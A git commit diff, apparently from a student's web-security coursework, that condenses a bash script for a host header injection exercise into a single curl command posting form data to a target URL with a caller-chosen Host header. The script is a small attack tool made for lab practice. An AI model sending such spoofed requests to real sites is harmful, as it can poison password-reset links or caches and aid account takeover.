7d8307c23627b86f7395aadd2dd1dc9eff27de17
Jose Mayo <josemayo3@gmail.com>
2025-05-03 16:23:53 -0400

    push task

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,15 +1,2 @@
 #!/bin/bash
-
-# Check if the correct number of arguments is provided
-if [ "$#" -ne 3 ]; then
-  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
-  exit 1
-fi
-
-# Assign arguments to variables
-new_host="$1"
-target_url="$2"
-form_data="$3"
-
-# Perform the curl request with the Host header injection
-curl -v -X POST -H "Host: $new_host" -d "$form_data" "$target_url"
+curl -s -X POST -H "Host: $1" -d "$3" "$2"
